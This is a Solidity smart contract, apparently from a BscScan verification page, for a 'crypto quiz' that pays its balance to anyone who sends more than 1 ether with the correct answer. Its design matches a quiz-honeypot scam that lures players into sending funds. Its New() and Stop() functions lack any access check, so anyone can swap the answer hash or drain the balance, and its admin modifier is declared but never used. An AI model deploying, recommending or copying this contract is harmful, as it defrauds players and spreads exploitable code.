/**
 *Submitted for verification at BscScan.com on 2022-07-19
*/

contract the_crypto_QUIZ
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 public responseHash;
    bytes32 public response;
    mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {

    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

function conv(string calldata _response) public {
response=keccak256(abi.encode(_response));
    }

 receive() external payable {

 }
 fallback() external {

 }


}